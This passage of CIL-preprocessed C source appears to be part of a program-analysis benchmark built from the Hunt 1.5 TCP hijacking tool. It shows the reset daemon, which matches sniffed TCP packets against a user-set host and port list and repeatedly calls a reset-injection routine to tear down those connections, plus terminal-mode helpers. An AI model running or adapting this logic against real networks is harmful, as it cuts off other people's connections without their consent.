   int err ;
   unsigned int ip ;
   int name_len ;
   char name[0] ;
};
#line 34 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/resolv.c"
struct slave {
   struct req s_req ;
   time_t s_timestamp ;
   pid_t s_pid ;
   int s_fd ;
   struct slave *s_next ;
};
#line 374 "/usr/include/netinet/in.h"
extern  __attribute__((__nothrow__)) uint32_t ( __attribute__((__leaf__)) ntohl)(uint32_t __netlong )  __attribute__((__const__)) ;
#line 375
extern  __attribute__((__nothrow__)) uint16_t ( __attribute__((__leaf__)) ntohs)(uint16_t __netshort )  __attribute__((__const__)) ;
#line 377
extern  __attribute__((__nothrow__)) uint32_t ( __attribute__((__leaf__)) htonl)(uint32_t __hostlong )  __attribute__((__const__)) ;
#line 97 "/usr/include/x86_64-linux-gnu/sys/resource.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) setpriority)(__priority_which_t __which ,
                                                                                  id_t __who ,
                                                                                  int __prio ) ;
#line 334 "/usr/include/time.h"
extern int nanosleep(struct timespec  const  *__requested_time , struct timespec *__remaining ) ;
#line 30 "/usr/include/x86_64-linux-gnu/bits/sigthread.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) pthread_sigmask)(int __how ,
                                                                                      __sigset_t const   * __restrict  __newmask ,
                                                                                      __sigset_t * __restrict  __oldmask ) ;
#line 35
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) pthread_kill)(pthread_t __threadid ,
                                                                                   int __signo ) ;
#line 244 "/usr/include/pthread.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,3))) pthread_create)(pthread_t * __restrict  __newthread ,
                                                                                             pthread_attr_t const   * __restrict  __attr ,
                                                                                             void *(*__start_routine)(void * ) ,
                                                                                             void * __restrict  __arg ) ;
#line 261
extern int pthread_join(pthread_t __th , void **__thread_return ) ;
#line 70 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/list.h"
void list_enqueue(struct list *l , void *m ) ;
#line 71
void list_produce(struct list *l , void *m ) ;
#line 72
void list_produce_start(struct list *l ) ;
#line 73
void list_produce_done(struct list *l ) ;
#line 74
void list_insert_at(struct list *l , int nr , void *m ) ;
#line 77
void *list_consume(struct list *l , struct timespec  const  *absts ) ;
#line 80
void *list_at(struct list *l , int nr ) ;
#line 81
void *list_remove(struct list *l , void *m ) ;
#line 82
void *list_remove_at(struct list *l , int nr ) ;
#line 84
int list_count(struct list *l ) ;
#line 86
void list_lock(struct list *l ) ;
#line 87
void list_unlock(struct list *l ) ;
#line 89
void list_iter_set(struct list_iterator *i , struct list *l ) ;
#line 90
void *list_iter_get(struct list_iterator *i ) ;
#line 91
void list_iter_end(struct list_iterator *i ) ;
#line 64 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
sigset_t intr_mask ;
#line 145
struct list l_ifunc_tcp ;
#line 294 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
__inline extern unsigned int generate_key(unsigned long saddr , unsigned long daddr ,
                                          unsigned short source , unsigned short dest ) 
{ 


  {
#line 297
  return ((unsigned int )(((saddr + daddr) + (unsigned long )source) + (unsigned long )dest));
}
}
#line 307 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
__inline extern unsigned int uci_generate_key(struct user_conn_info *uci ) 
{ 
  uint16_t tmp ;
  uint16_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  unsigned int tmp___3 ;

  {
  {
#line 309
  tmp = ntohs(uci->dst_port);
#line 309
  tmp___0 = ntohs(uci->src_port);
#line 309
  tmp___1 = ntohl((uint32_t )uci->dst_addr);
#line 309
  tmp___2 = ntohl((uint32_t )uci->src_addr);
#line 309
  tmp___3 = generate_key((unsigned long )tmp___2, (unsigned long )tmp___1, tmp___0,
                         tmp);
  }
#line 309
  return (tmp___3);
}
}
#line 329
void packet_free(struct packet *p ) ;
#line 330
void packet_want(struct packet *p ) ;
#line 331
void packet_flush(struct list *l ) ;
#line 336
void conn_free(struct conn_info *ci ) ;
#line 337
struct conn_info *conn_get(struct user_conn_info *uci ) ;
#line 357
int menu_choose_unr(char *label , int min , int max , int dfl ) ;
#line 358
int menu_choose_char(char *label , char *opt , char dfl ) ;
#line 361
int menu(char *head , char *str_menu , char *label , char *opt , char dfl ) ;
#line 366
int menu_choose_sdb(char *label , char dfl ) ;
#line 370
int menu_choose_host_mask_ports_dfl(char *label , unsigned int *ret_ip , unsigned int *ret_mask ,
                                    unsigned int *ret_ports , unsigned int dfl_ip ,
                                    unsigned int dfl_mask , int *dfl_ports ) ;
#line 381
int sdb_to_int(char mode ) ;
#line 382
char int_to_sdb(int mode ) ;
#line 383
char *sdbmode_to_char(int mode ) ;
#line 406
void set_tty_color(enum TTY_COLOR color ) ;
#line 411
int count_mask(unsigned int mask ) ;
#line 415
int sprintf_db_ports(unsigned int *ports , char *buf , int buf_size , int all ) ;
#line 427
int port_match(int port , unsigned int *db_ports ) ;
#line 428
void port_htons(unsigned int *db_ports ) ;
#line 451
int hl_mode ;
#line 452
char *host_lookup(unsigned int in , int use_mode ) ;
#line 475
void rst(struct conn_info *ci , int count___0 , int rstdst ) ;
#line 562
void rstd_menu(void) ;
#line 563
void print_rst_daemon(void) ;
#line 605
int lines_o ;
#line 609
void lines_o_press_key(void) ;
#line 362 "/usr/include/stdio.h"
extern int printf(char const   * __restrict  __format  , ...) ;
#line 364
extern  __attribute__((__nothrow__)) int sprintf(char * __restrict  __s , char const   * __restrict  __format 
                                                 , ...) ;
#line 46 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1,2), __leaf__)) memcpy)(void * __restrict  __dest ,
                                                                                                 void const   * __restrict  __src ,
                                                                                                 size_t __n ) ;
#line 66
extern  __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1), __leaf__)) memset)(void *__s ,
                                                                                               int __c ,
                                                                                               size_t __n ) ;
#line 466 "/usr/include/stdlib.h"
extern  __attribute__((__nothrow__)) void *( __attribute__((__leaf__)) malloc)(size_t __size )  __attribute__((__malloc__)) ;
#line 483
extern  __attribute__((__nothrow__)) void ( __attribute__((__leaf__)) free)(void *__ptr ) ;
#line 628 "/usr/include/unistd.h"
extern  __attribute__((__nothrow__)) __pid_t ( __attribute__((__leaf__)) getpid)(void) ;
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static struct list l_rst_packet  = 
#line 31 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct packet *)0)->p_next[2]) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 33 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static struct ifunc_item ifunc_tcp  ;
#line 34 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static pthread_t rstd_thr  ;
#line 35 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static int rstd_running  =    0;
#line 36 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static struct list l_rst_db  = 
#line 36
     {(void *)0, (void *)0, (int )((char *)(& ((struct rst_db_item *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 39 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
__inline static int packet_match_db_item(struct packet *p , struct rst_db_item *dbi ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int tmp ;
  int tmp___0 ;

  {
#line 41
  iph = p->p_iph;
#line 42
  tcph = p->p_hdr.p_tcph;
#line 44
  if ((iph->saddr & dbi->src_mask) == (dbi->src_addr & dbi->src_mask)) {
#line 44
    if ((iph->daddr & dbi->dst_mask) == (dbi->dst_addr & dbi->dst_mask)) {
      {
#line 44
      tmp = port_match((int )tcph->__annonCompField3.__annonCompField2.source, dbi->src_ports);
      }
#line 44
      if (tmp) {
        {
#line 44
        tmp___0 = port_match((int )tcph->__annonCompField3.__annonCompField2.dest,
                             dbi->dst_ports);
        }
#line 44
        if (tmp___0) {
#line 48
          if (! dbi->rst_only_syn) {
#line 49
            return (1);
          }
#line 51
          if (tcph->__annonCompField3.__annonCompField2.syn) {
#line 52
            return (1);
          }
        }
      }
    }
  }
#line 56
  return (0);
}
}
#line 59 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static struct rst_db_item *packet_match_db(struct packet *p ) 
{ 
  struct list_iterator li ;
  struct rst_db_item *dbi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 64
  list_lock(& l_rst_db);
#line 65
  list_iter_set(& li, & l_rst_db);
  }
  {
#line 66
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 66
    tmp___0 = list_iter_get(& li);
#line 66
    dbi = (struct rst_db_item *)tmp___0;
    }
#line 66
    if (! dbi) {
#line 66
      goto while_break;
    }
    {
#line 67
    tmp = packet_match_db_item(p, dbi);
    }
#line 67
    if (tmp) {
#line 68
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 70
  list_iter_end(& li);
#line 71
  list_unlock(& l_rst_db);
  }
#line 72
  return (dbi);
}
}
#line 78 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void func_tcp_packet(struct packet *p , void *arg ) 
{ 
  struct rst_db_item *dbi ;

  {
#line 82
  if ((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.fin) {
#line 83
    return;
  }
  {
#line 84
  dbi = packet_match_db(p);
  }
#line 84
  if (dbi) {
    {
#line 85
    packet_want(p);
#line 86
    p->p_arg[2] = (void *)dbi->rst_mode;
#line 87
    list_produce(& l_rst_packet, (void *)p);
    }
  }
#line 89
  return;
}
}
#line 91 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void *rst_daemon_thr(void *arg ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  struct conn_info *ci ;
  struct conn_info __ci ;
  struct conn_info *pci ;
  struct user_conn_info uci ;
  struct packet *p ;
  struct timespec ts ;
  int rst_mode ;
  __pid_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  void *tmp___2 ;

  {
  {
#line 102
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 103
  tmp = getpid();
#line 103
  setpriority(0, (id_t )tmp, 0);
  }
  {
#line 104
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 104
    tmp___2 = list_consume(& l_rst_packet, (struct timespec  const  *)((void *)0));
#line 104
    p = (struct packet *)tmp___2;
    }
#line 104
    if (! p) {
#line 104
      goto while_break;
    }
    {
#line 105
    iph = p->p_iph;
#line 106
    tcph = p->p_hdr.p_tcph;
#line 107
    uci.src_addr = (unsigned long )iph->saddr;
#line 108
    uci.dst_addr = (unsigned long )iph->daddr;
#line 109
    uci.src_port = tcph->__annonCompField3.__annonCompField2.source;
#line 110
    uci.dst_port = tcph->__annonCompField3.__annonCompField2.dest;
#line 111
    pci = conn_get(& uci);
    }
#line 111
    if (pci) {
#line 138
      ci = pci;
    } else {
      {
#line 112
      __ci.src_addr = (unsigned long )iph->saddr;
#line 113
      __ci.dst_addr = (unsigned long )iph->daddr;
#line 114
      __ci.src_port = tcph->__annonCompField3.__annonCompField2.source;
#line 115
      __ci.dst_port = tcph->__annonCompField3.__annonCompField2.dest;
#line 117
      tmp___0 = ntohl(tcph->__annonCompField3.__annonCompField2.seq);
#line 117
      tmp___1 = htonl(tmp___0 + (uint32_t )p->p_data_len);
#line 117
      __ci.src.next_seq = (unsigned long )tmp___1;
      }
#line 118
      if (tcph->__annonCompField3.__annonCompField2.ack) {
#line 118
        __ci.src.next_d_seq = (unsigned long )tcph->__annonCompField3.__annonCompField2.ack_seq;
      } else {
#line 118
        __ci.src.next_d_seq = 0UL;
      }
      {
#line 119
      memcpy((void */* __restrict  */)(__ci.src.src_mac), (void const   */* __restrict  */)((p->p_ethh)->h_source),
             (size_t )6);
#line 120
      memcpy((void */* __restrict  */)(__ci.src.dst_mac), (void const   */* __restrict  */)((p->p_ethh)->h_dest),
             (size_t )6);
#line 121
      __ci.src.window = tcph->__annonCompField3.__annonCompField2.window;
#line 122
      __ci.src.id = iph->id;
#line 124
      __ci.dst.next_seq = __ci.src.next_d_seq;
#line 125
      __ci.dst.next_d_seq = __ci.src.next_seq;
#line 130
      memcpy((void */* __restrict  */)(__ci.dst.src_mac), (void const   */* __restrict  */)((p->p_ethh)->h_dest),
             (size_t )6);
#line 131
      memcpy((void */* __restrict  */)(__ci.dst.dst_mac), (void const   */* __restrict  */)((p->p_ethh)->h_source),
             (size_t )6);
#line 133
      __ci.dst.window = tcph->__annonCompField3.__annonCompField2.window;
#line 134
      __ci.dst.id = iph->id;
#line 136
      ci = & __ci;
      }
    }
    {
#line 139
    packet_free(p);
#line 140
    rst_mode = (int )p->p_arg[2];
#line 141
    ts.tv_sec = (__time_t )0;
#line 142
    ts.tv_nsec = (__syscall_slong_t )100000000;
    }
    {
#line 144
    if (rst_mode == 0) {
#line 144
      goto case_0;
    }
#line 149
    if (rst_mode == 1) {
#line 149
      goto case_1;
    }
#line 154
    if (rst_mode == 2) {
#line 154
      goto case_2;
    }
#line 143
    goto switch_break;
    case_0: /* CIL Label */ 
    {
#line 145
    rst(ci, 4, 0);
#line 146
    nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 147
    rst(ci, 4, 0);
    }
#line 148
    goto switch_break;
    case_1: /* CIL Label */ 
    {
#line 150
    rst(ci, 4, 1);
#line 151
    nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 152
    rst(ci, 4, 1);
    }
#line 153
    goto switch_break;
    case_2: /* CIL Label */ 
    {
#line 155
    rst(ci, 4, 0);
#line 156
    rst(ci, 4, 1);
#line 157
    nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 158
    rst(ci, 4, 0);
#line 159
    rst(ci, 4, 1);
    }
#line 160
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
#line 162
    if (pci) {
      {
#line 163
      conn_free(pci);
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 165
  return ((void *)0);
}
}
#line 168 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_daemon_start(void) 
{ 


  {
#line 170
  if (rstd_running) {
    {
#line 171
    printf((char const   */* __restrict  */)"daemon already running\n");
    }
#line 172
    return;
  }
  {
#line 174
  list_produce_start(& l_rst_packet);
#line 175
  ifunc_tcp.func = & func_tcp_packet;
#line 176
  ifunc_tcp.arg = (void *)0;
#line 177
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_tcp));
#line 179
  pthread_create((pthread_t */* __restrict  */)(& rstd_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 & rst_daemon_thr, (void */* __restrict  */)((void *)0));
#line 180
  rstd_running = 1;
#line 181
  printf((char const   */* __restrict  */)"rst daemon started\n");
  }
#line 182
  return;
}
}
#line 184 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_daemon_stop(void) 
{ 


  {
#line 186
  if (! rstd_running) {
    {
#line 187
    printf((char const   */* __restrict  */)"daemon isn\'t running\n");
    }
#line 188
    return;
  }
  {
#line 190
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_tcp));
#line 191
  packet_flush(& l_rst_packet);
#line 192
  list_produce_done(& l_rst_packet);
#line 194
  pthread_join(rstd_thr, (void **)((void *)0));
#line 195
  rstd_running = 0;
#line 196
  printf((char const   */* __restrict  */)"rst daemon stoped\n");
  }
#line 197
  return;
}
}
#line 199 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
void print_rst_daemon(void) 
{ 
  int tmp ;

  {
#line 201
  if (rstd_running) {
    {
#line 202
    tmp = pthread_kill(rstd_thr, 0);
    }
#line 202
    if (tmp != 0) {
      {
#line 203
      pthread_join(rstd_thr, (void **)((void *)0));
#line 204
      rstd_thr = (pthread_t )0;
#line 205
      rstd_running = 0;
#line 206
      set_tty_color((enum TTY_COLOR )9);
#line 207
      printf((char const   */* __restrict  */)"RST daemon failed - bug\n");
#line 208
      set_tty_color((enum TTY_COLOR )7);
      }
    } else {
      {
#line 210
      printf((char const   */* __restrict  */)"R");
      }
    }
  }
#line 212
  return;
}
}
#line 219 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void db_item_print(int i , struct rst_db_item *dbi ) 
{ 
  char *str_mode ;
  char buf_src_ports[512] ;
  char buf_dst_ports[512] ;
  char buf[512] ;
  int tmp ;
  char *tmp___0 ;
  char const   *tmp___1 ;
  int tmp___2 ;
  char *tmp___3 ;

  {
  {
#line 225
  str_mode = sdbmode_to_char(dbi->rst_mode);
#line 226
  sprintf_db_ports(dbi->src_ports, buf_src_ports, (int )sizeof(buf_src_ports), 1);
#line 227
  sprintf_db_ports(dbi->dst_ports, buf_dst_ports, (int )sizeof(buf_dst_ports), 1);
#line 228
  tmp = count_mask(dbi->src_mask);
#line 228
  tmp___0 = host_lookup(dbi->src_addr, hl_mode);
#line 228
  sprintf((char */* __restrict  */)(buf), (char const   */* __restrict  */)"%s/%d [%s]",
          tmp___0, tmp, buf_src_ports);
  }
#line 230
  if (dbi->rst_only_syn) {
#line 230
    tmp___1 = "SYN only";
  } else {
#line 230
    tmp___1 = "all";
  }
  {
#line 230
  tmp___2 = count_mask(dbi->dst_mask);
#line 230
  tmp___3 = host_lookup(dbi->dst_addr, hl_mode);
#line 230
  printf((char const   */* __restrict  */)"%2d) %-24s --> %s/%d [%s] rst %s %s\n",
         i, buf, tmp___3, tmp___2, buf_dst_ports, str_mode, tmp___1);
  }
#line 236
  return;
}
}
#line 238 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_list_items(void) 
{ 
  struct list_iterator li ;
  struct rst_db_item *dbi ;
  int i ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 242
  i = 0;
#line 244
  list_iter_set(& li, & l_rst_db);
  }
  {
#line 245
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 245
    tmp___0 = list_iter_get(& li);
#line 245
    dbi = (struct rst_db_item *)tmp___0;
    }
#line 245
    if (! dbi) {
#line 245
      goto while_break;
    }
    {
#line 246
    tmp = i;
#line 246
    i ++;
#line 246
    db_item_print(tmp, dbi);
    }
#line 247
    if (i % lines_o == 0) {
      {
#line 248
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 250
  list_iter_end(& li);
  }
#line 251
  return;
}
}
#line 254 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_add_item(void) 
{ 
  struct rst_db_item *dbi ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int mode ;
  int syn_mode ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 264
  tmp = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                        & src_mask, (unsigned int *)(src_ports), 0U,
                                        0U, (int *)((void *)0));
  }
#line 264
  if (tmp < 0) {
#line 266
    return;
  }
  {
#line 267
  tmp___0 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            0U, 0U, (int *)((void *)0));
  }
#line 267
  if (tmp___0 < 0) {
#line 269
    return;
  }
  {
#line 270
  mode = menu_choose_sdb((char *)"mode", (char )'b');
  }
#line 270
  if (mode == -1) {
#line 271
    return;
  }
  {
#line 272
  syn_mode = menu_choose_char((char *)"reset only syn y/n", (char *)"yn", (char )'y');
  }
#line 272
  if (syn_mode == -1) {
#line 273
    return;
  }
  {
#line 274
  tmp___1 = list_count(& l_rst_db);
#line 274
  tmp___2 = list_count(& l_rst_db);
#line 274
  nr = menu_choose_unr((char *)"insert at", 0, tmp___2, tmp___1);
  }
#line 274
  if (nr == -1) {
#line 275
    return;
  }
  {
#line 277
  tmp___3 = malloc(sizeof(struct rst_db_item ));
#line 277
  dbi = (struct rst_db_item *)tmp___3;
#line 278
  memset((void *)dbi, 0, sizeof(struct rst_db_item ));
#line 279
  dbi->src_addr = src_ip;
#line 280
  dbi->src_mask = src_mask;
#line 281
  port_htons((unsigned int *)(src_ports));
#line 282
  memcpy((void */* __restrict  */)(dbi->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 283
  dbi->dst_addr = dst_ip;
#line 284
  dbi->dst_mask = dst_mask;
#line 285
  port_htons((unsigned int *)(dst_ports));
#line 286
  memcpy((void */* __restrict  */)(dbi->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 287
  dbi->rst_mode = sdb_to_int((char )mode);
  }
  {
#line 289
  if (syn_mode == 121) {
#line 289
    goto case_121;
  }
#line 292
  if (syn_mode == 110) {
#line 292
    goto case_110;
  }
#line 288
  goto switch_break;
  case_121: /* CIL Label */ 
#line 290
  dbi->rst_only_syn = 1;
#line 291
  goto switch_break;
  case_110: /* CIL Label */ 
#line 293
  dbi->rst_only_syn = 0;
#line 294
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
  {
#line 296
  list_insert_at(& l_rst_db, nr, (void *)dbi);
  }
#line 297
  return;
}
}
#line 299 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_mod_item(void) 
{ 
  struct rst_db_item *dbi ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int mode ;
  int syn_mode ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  char tmp___4 ;
  int tmp___5 ;

  {
  {
#line 308
  rst_list_items();
#line 309
  tmp = list_count(& l_rst_db);
#line 309
  tmp___0 = list_count(& l_rst_db);
#line 309
  nr = menu_choose_unr((char *)"choose item", 0, tmp___0 - 1, tmp - 1);
  }
#line 309
  if (nr == -1) {
#line 310
    return;
  }
  {
#line 311
  tmp___1 = list_at(& l_rst_db, nr);
#line 311
  dbi = (struct rst_db_item *)tmp___1;
  }
#line 311
  if (! dbi) {
#line 312
    return;
  }
  {
#line 313
  tmp___2 = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                            & src_mask, (unsigned int *)(src_ports),
                                            dbi->src_addr, dbi->src_mask, (int *)(dbi->src_ports));
  }
#line 313
  if (tmp___2 < 0) {
#line 316
    return;
  }
  {
#line 317
  tmp___3 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            dbi->dst_addr, dbi->dst_mask, (int *)(dbi->dst_ports));
  }
#line 317
  if (tmp___3 < 0) {
#line 320
    return;
  }
  {
#line 321
  tmp___4 = int_to_sdb(dbi->rst_mode);
#line 321
  mode = menu_choose_sdb((char *)"mode", tmp___4);
  }
#line 321
  if (mode == -1) {
#line 322
    return;
  }
#line 323
  if (dbi->rst_only_syn) {
#line 323
    tmp___5 = 'y';
  } else {
#line 323
    tmp___5 = 'n';
  }
  {
#line 323
  syn_mode = menu_choose_char((char *)"reset only syn y/n", (char *)"yn", (char )tmp___5);
  }
#line 323
  if (syn_mode == -1) {
#line 324
    return;
  }
  {
#line 326
  port_htons((unsigned int *)(src_ports));
#line 327
  port_htons((unsigned int *)(dst_ports));
#line 329
  dbi->src_addr = src_ip;
#line 330
  dbi->src_mask = src_mask;
#line 331
  memcpy((void */* __restrict  */)(dbi->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 332
  dbi->dst_addr = dst_ip;
#line 333
  dbi->dst_mask = dst_mask;
#line 334
  memcpy((void */* __restrict  */)(dbi->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 335
  dbi->rst_mode = sdb_to_int((char )mode);
  }
  {
#line 337
  if (syn_mode == 121) {
#line 337
    goto case_121;
  }
#line 340
  if (syn_mode == 110) {
#line 340
    goto case_110;
  }
#line 336
  goto switch_break;
  case_121: /* CIL Label */ 
#line 338
  dbi->rst_only_syn = 1;
#line 339
  goto switch_break;
  case_110: /* CIL Label */ 
#line 341
  dbi->rst_only_syn = 0;
#line 342
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 344
  return;
}
}
#line 346 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
static void rst_del_item(void) 
{ 
  int i ;
  struct rst_db_item *dbi ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 351
  rst_list_items();
#line 352
  tmp = list_count(& l_rst_db);
#line 352
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 354
  if (i >= 0) {
    {
#line 355
    tmp___0 = list_remove_at(& l_rst_db, i);
#line 355
    dbi = (struct rst_db_item *)tmp___0;
#line 356
    free((void *)dbi);
    }
  }
#line 358
  return;
}
}
#line 360 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/rstd.c"
void rstd_menu(void) 
{ 
  char *r_menu ;
  char *r_keys ;
  int run_it ;
  int tmp ;

  {
#line 362
  r_menu = (char *)"s/k)   start/stop daemon\nl)     list reset database\na/m/d) add/mod/del entry\nx)     return\n";
#line 366
  r_keys = (char *)"skladmx";
#line 369
  run_it = 1;
  {
#line 370
  while (1) {
    while_continue: /* CIL Label */ ;
#line 370
    if (! run_it) {
#line 370
      goto while_break;
    }
    {
#line 371
    tmp = menu((char *)"reset daemon", r_menu, (char *)"rstd", r_keys, (char)0);
    }
    {
#line 372
    if (tmp == 115) {
#line 372
      goto case_115;
    }
#line 375
    if (tmp == 107) {
#line 375
      goto case_107;
    }
#line 378
    if (tmp == 108) {
#line 378
      goto case_108;
    }
#line 381
    if (tmp == 97) {
#line 381
      goto case_97;
    }
#line 384
    if (tmp == 100) {
#line 384
      goto case_100;
    }
#line 387
    if (tmp == 109) {
#line 387
      goto case_109;
    }
#line 390
    if (tmp == 120) {
#line 390
      goto case_120;
    }
#line 371
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 373
    rst_daemon_start();
    }
#line 374
    goto switch_break;
    case_107: /* CIL Label */ 
    {
#line 376
    rst_daemon_stop();
    }
#line 377
    goto switch_break;
    case_108: /* CIL Label */ 
    {
#line 379
    rst_list_items();
    }
#line 380
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 382
    rst_add_item();
    }
#line 383
    goto switch_break;
    case_100: /* CIL Label */ 
    {
#line 385
    rst_del_item();
    }
#line 386
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 388
    rst_mod_item();
    }
#line 389
    goto switch_break;
    case_120: /* CIL Label */ 
#line 391
    run_it = 0;
#line 392
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 395
  return;
}
}
#line 583 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
int tty_cbreak(int fd , int wait_for_chars , int timer_dsec ) ;
#line 584
int tty_raw(int fd , int wait_for_chars , int timer_dsec ) ;
#line 585
int tty_reset(int fd ) ;
#line 586
void tty_atexit(void) ;
#line 587
void tty_tput_reset(void) ;
#line 66 "/usr/include/termios.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) tcgetattr)(int __fd ,
                                                                                struct termios *__termios_p ) ;
#line 70
extern  __attribute__((__nothrow__)) int ( __attribute__((__leaf__)) tcsetattr)(int __fd ,
                                                                                int __optional_actions ,
                                                                                struct termios  const  *__termios_p ) ;
#line 169 "/usr/include/stdio.h"
extern struct _IO_FILE *stdout ;
#line 242
extern int fflush(FILE *__stream ) ;
#line 14 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
static struct termios save_termios  ;
#line 15 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
static int ttysavefd  =    -1;
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
static enum __anonenum_ttystate_99 ttystate  =    (enum __anonenum_ttystate_99 )0;
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/tty.c"
int tty_cbreak(int fd , int wait_for_chars , int timer_dsec ) 
{ 
  struct termios buf ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 23
  tmp = tcgetattr(fd, & save_termios);
  }
#line 23
  if (tmp < 0) {
#line 24
    return (-1);
  }
  {
#line 25
  buf = save_termios;
#line 26
  buf.c_lflag &= 4294967285U;
#line 28
  buf.c_cc[6] = (cc_t )wait_for_chars;
#line 29
  buf.c_cc[5] = (cc_t )timer_dsec;
#line 31
  tmp___0 = tcsetattr(fd, 2, (struct termios  const  *)(& buf));
  }
#line 31
  if (tmp___0 < 0) {
#line 32
    return (-1);
  }
#line 33
  ttystate = (enum __anonenum_ttystate_99 )2;
#line 34
  ttysavefd = fd;
